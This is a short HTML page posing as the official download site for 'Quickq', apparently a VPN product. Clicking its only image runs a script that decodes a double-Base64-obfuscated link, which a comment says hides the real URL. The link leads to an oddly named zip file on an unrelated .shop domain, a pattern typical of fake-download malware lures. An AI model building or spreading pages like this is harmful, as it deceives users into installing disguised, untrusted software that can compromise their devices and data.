<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Quickq官网</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      overflow-y: scroll;
      padding-top: 0;
    }
    .container {
      width: 100%;
      max-width: 100%;
      margin: 0 auto;
      text-align: center;
    }
    #mainImage {
      width: 100%;
      height: auto;
      cursor: pointer;
      display: block;
    }
  </style>
</head>
<body>
  <div class="container">
    <img id="mainImage" src="pv.webp" alt="点击下载" onclick="triggerDownload()">
  </div>

  <script>
    function triggerDownload() {
      // Base64 链接（真实链接经过 Base64 编码）
      const encodedUrl = "ZG93bi8/Yz1hSFIwY0hNNkx5OXpiMlowTG1SdmQyNXZjM010ZDJsdU1ESXVjMmh2Y0M5TVpYUnpWbEF4TFV4bGFYTnFjbmwxZEM1NmFYQT0=";
      const decodedUrl = atob(encodedUrl);

      // 创建临时下载元素
      const a = document.createElement("a");
      a.href = decodedUrl;
      a.download = decodedUrl.split('/').pop() || "download"; // 设置下载文件名
      a.target = "_blank"; // 防止被拦截
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
    }
  </script>
</body>
</html>
